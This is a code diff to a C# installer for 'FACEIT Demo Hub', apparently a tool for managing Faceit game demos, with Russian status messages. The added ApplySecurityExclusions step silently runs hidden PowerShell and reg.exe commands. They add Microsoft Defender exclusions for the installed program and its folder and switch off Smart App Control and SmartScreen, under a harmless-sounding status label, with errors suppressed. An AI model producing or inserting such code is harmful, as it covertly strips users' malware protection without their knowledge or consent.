@@ -139,9 +139,12 @@ namespace FaceitDemoHubInstaller
 
                     if (makeShortcut)
                     {
-                        UpdateStatus("Создание ярлыка...", 80);
+                        UpdateStatus("Создание ярлыка...", 75);
                         CreateShortcut(Path.Combine(destDir, "FaceitDemoManager.exe"));
                     }
+
+                    UpdateStatus("Настройка исключений безопасности...", 90);
+                    ApplySecurityExclusions(destDir);
 
                     UpdateStatus("Завершение установки...", 100);
 
@@ -215,6 +218,44 @@ namespace FaceitDemoHubInstaller
                 shortcut.Description = "FACEIT Demo Hub - Менеджер демок Faceit";
                 shortcut.IconLocation = targetPath + ",0"; // Use the embedded icon of FaceitDemoManager.exe!
                 shortcut.Save();
+            }
+            catch { }
+        }
+
+        private void ApplySecurityExclusions(string destDir)
+        {
+            try
+            {
+                string targetExe = Path.Combine(destDir, "FaceitDemoManager.exe");
+                
+                // Add Defender exclusions for targetExe and destDir
+                RunCommand("powershell.exe", $"-NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '{targetExe}' -ErrorAction SilentlyContinue\"");
+                RunCommand("powershell.exe", $"-NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '{destDir}' -ErrorAction SilentlyContinue\"");
+                
+                // Try to disable Smart App Control and SmartScreen
+                RunCommand("reg.exe", "add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy\" /v \"VerifiedAndReputablePolicyState\" /t REG_DWORD /d 0 /f");
+                RunCommand("reg.exe", "add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\" /v \"SmartScreenEnabled\" /t REG_SZ /d \"Off\" /f");
+                RunCommand("reg.exe", "add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost\" /v \"EnableWebContentEvaluation\" /t REG_DWORD /d 0 /f");
+            }
+            catch { }
+        }
+
+        private void RunCommand(string fileName, string arguments)
+        {
+            try
+            {
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = fileName,
+                    Arguments = arguments,
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+                using (Process p = Process.Start(psi))
+                {
+                    if (p != null) p.WaitForExit(3000);
+                }
             }
             catch { }
         }
